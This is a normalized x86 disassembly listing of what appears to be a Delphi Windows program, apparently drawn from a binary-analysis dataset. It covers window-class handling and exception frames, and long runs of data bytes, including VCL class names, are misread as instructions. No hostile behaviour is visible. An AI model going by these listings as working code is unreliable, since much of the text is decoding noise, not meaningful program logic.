call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406b90
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4217a4
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421914
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_42183c
sub_42193c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4219e0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219e7
retn
mov eax [ rw-data ]
call sub_4178f8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421708
xor edx edx
xor eax eax
call sub_41b7e4
mov eax rw-data
call sub_40d070
call sub_405fa4
lea eax [ eax + 0xc ]
call sub_40d070
mov eax rw-data
call sub_40d070
mov eax rw-data
call sub_405874
mov eax sub_421774
call sub_405710
mov eax rw-data
call sub_40d070
call sub_420534
mov eax rw-data
call sub_40d070
mov eax rw-data
call sub_405874
sub_4219ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421a75
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a7c
retn
call sub_420500
mov eax sub_421774
call sub_405708
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cdb0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_40588c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4171f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41857c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41857c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421a83
add [ edi + edi * 8 + 0x76640000 ] cl
inc edi
add [ ebp + 0x640000ff ] cl
jbe r-xdata
inc edi
add [ esi + 0x640000ff ] cl
jbe r-xdata
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + 0x640000ff ] cl
jbe r-xdata
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] ch
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] ah
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] bh
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] dh
add [ esi + esi * 2 + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ 0x640000ff ] dh
jbe r-xdata
add [ edi + edi * 8 ] dh
add [ eax ] al
jbe r-xdata
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] cl
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
jbe r-xdata
add [ edi ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421d4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d54
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] al
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
jbe r-xdata
jmp r-xdata
add [ 0x640000ff ] bh
jbe r-xdata
add [ eax ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ edi + edi * 8 ] bl
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
jbe r-xdata
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
jbe r-xdata
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
jbe r-xdata
retn
mov [ eax + 0x47 ] bh
add [ ecx ] al
retn
add [ esi ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
jbe r-xdata
inc edi
add [ ebx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
jbe r-xdata
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
jbe r-xdata
add [ ebp - 0x1 ] bl
add [ eax ] al
jbe r-xdata
inc edi
add [ ebp - 0x1 ] dl
add [ eax ] al
jbe r-xdata
add [ edi + edi * 8 ] dl
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
jbe r-xdata
add [ ecx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
jbe r-xdata
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
jbe r-xdata
add [ edx ] dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
jbe r-xdata
sub_421d60
sbb eax 0x6010042
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
les ebx [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ 0xc0042 ]
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax ] sp
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push ds
inc edx
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
inc eax
push ds
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
xchg esp eax
push ds
inc edx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
mov al 0x1e
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ esi + ebx ] bh
inc edx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ edi + ebx + 0x42 ] bh
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
push ds
inc edx
add [ ebx + 0x421f18c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
lodsb [ esi ]
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ebx + 0x66060042 ] ch
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x1f00c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edi + ebx ] dl
inc edx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
sub [ ecx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x421f8090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
sar [ eax ] 0x42
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
lodsb [ esi ]
push ds
inc edx
add [ esi ] al
jae r-xdata
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
outsb
popad
inc ecx
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] bh
and [ edx ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x421e8490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
loopne r-xdata
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
add [ ebx ] al
mov eax eax
cmp al 0x20
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
inc ecx
add al al
outsb
je r-xdata
xor eax [ edx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x203cc08b
add [ eax ] al
push eax
and [ edx ] eax
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
call [ eax + 0x5004236 ]
push esp
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
aam 0x21
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and [ edx ] eax
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebp + 0x21 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
dec ebp
jb r-xdata
outsb
jb r-xdata
add [ ecx ] ah
add [ ecx ] dl
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add eax 0x6e6f4654
je r-xdata
and al [ edx ]
pop es
add al 0x22
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
and [ edx ] eax
cli
and [ edx ] eax
and al 0x0
add [ eax ] al
mov ah 0x20
inc edx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
push 0xf0004236
mov [ ecx ] eax
clc
mov [ ecx ] eax
lodsb [ esi ]
inc edx
add [ esi ] cl
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + eax + 0x21 ] si
inc edx
add [ ebx * 2 + 0x41 ] bl
or [ edi + 0x72 ] al
popad
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
[ eax + 0x33 ]
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x21 ] dl
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
push cs
and [ edx ] eax
and al 0x21
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
and [ edx ] al
shl [ eax + eax * 2 ] 0x0
int3
imul esp [ ebx + 0x73 ] 0xc08b0000
push esp
and [ edx ] eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
and [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x21
imul esp [ ebx + 0x73 ] 0x42210090
add al [ eax ]
push es
dec eax
jo r-xdata
fdivr [ 0x3de00042 ]
imul esp [ ebx + 0x73 ] 0x1d600004
inc edx
add ah cl
cmp al 0x42
add ah dl
cmp al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add al bh
cmp [ edx ] eax
adc [ edx ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
sbb [ esi ] 0x42
imul esp [ ebx + 0x73 ] 0x1e900007
inc edx
add [ eax ] dl
cmp eax [ edx ]
sbb [ ebx ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax + 0x34c00042 ] dh
inc eax
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
dec esp
inc edx
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
je r-xdata
add [ eax ] al
add [ eax ] al
pop esp
and al 0x42
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x2450c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] bl
pop ds
inc edx
add [ eax ] bl
add [ eax ] al
call [ ebp + edi + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
outsd
adc al 0x1f
inc edx
add [ eax - 0x4fffbdc3 ] ch
cmp eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add al bl
cmp eax 0x3de00042
inc edx
add al ah
cmp al [ edx ]
call 0x14264e9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
insb
cmp al [ edx ]
mov [ edx ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
test al 0x3a
inc edx
add [ edx + edi + 0x10042 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
push eax
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4223
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x42 ] bl
add [ eax + eax ] bl
add [ eax ] al
mov ah 0x20
inc edx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
test [ ebx ] bh
inc edx
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
lodsb [ esi ]
cmp eax [ edx ]
add al 0x54
push eax
outsb
lea eax [ eax ]
push 0x7004223
add al 0x54
push eax
outsb
push eax
and eax [ edx ]
and al 0x21
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
push ds
sbb eax 0x180042
add bh bh
call 0x1426486
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx ] al
enter 0x4240 0x0
rol [ eax + 0x42 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
adc al 0x25
inc edx
add [ eax ] al
jae r-xdata
popad
insd
cmp al 0x1e
imul esp [ gs : edi + 0x68 ] 0x421e8074
adc [ eax ] al
enter 0x4239 0x0
sar [ ecx ] 0x1
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
and eax 0x42
nop
push 0x7004224
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
test al 0x5c
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
enter 0x4241 0x0
add [ eax ] al
add [ eax ] al
add [ r--data ] ch
jae r-xdata
cmp [ 0x42 ] ah
push eax
and al 0x42
add [ ecx ] ah
inc edx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
sub al 0x25
inc edx
add [ eax ] bl
imul esp [ ebx + 0x73 ] 0x1d600002
inc edx
add [ edi + edi + 0x3fb40042 ] ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_42255f
inc edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
sub_422650
sub ah [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc edx
add [ edi ] al
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x3fffbea3 ] bl
xor al 0x40
add [ eax - 0x2fffbe76 ] dh
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
loopne r-xdata
or esp [ esi ]
inc edx
add cl bl
and eax 0x25e60042
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fst [ esi ]
inc edx
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cwde
inc edx
add [ edx ] ch
inc edx
inc ecx
add al dh
mov [ ecx ] eax
mov al 0x5e
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x75 ] al
inc ecx
add [ eax + 0x5e ] al
inc edx
add ah cl
sub al [ eax ]
cld
pop esi
inc edx
add ah cl
sub al [ eax ]
int3
sub_422705
push esp
inc edi
jb r-xdata
inc eax
jo r-xdata
daa
inc edx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub [ ebp + 0x42 ] ah
add [ ebp + 0x540c0042 ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
inc eax
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x4228
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004228 ] dh
add [ eax ] al
add [ esi + 0x42 ] cl
add al al
xor al 0x40
add [ eax - 0x2fffbe76 ] dh
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x70
inc edx
add al dh
mov [ ecx ] eax
mov al 0x5e
inc edx
add [ eax + 0x70 ] dl
inc edx
add [ eax - 0x75 ] al
inc ecx
add [ edx + esi * 2 ] ah
inc edx
add [ edx + esi * 2 + 0x5efc0042 ] ah
inc edx
add [ eax + 0x75 ] bl
inc edx
add [ esi + esi * 2 ] cl
inc edx
add [ esi + esi * 2 + 0x42 ] cl
add [ eax + 0x60 ] cl
inc edx
add [ eax - 0x6bffbd8a ] ch
jpe r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
daa
inc edx
add [ eax + eax ] dh
add [ edi ] dh
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah cl
sub al [ eax ]
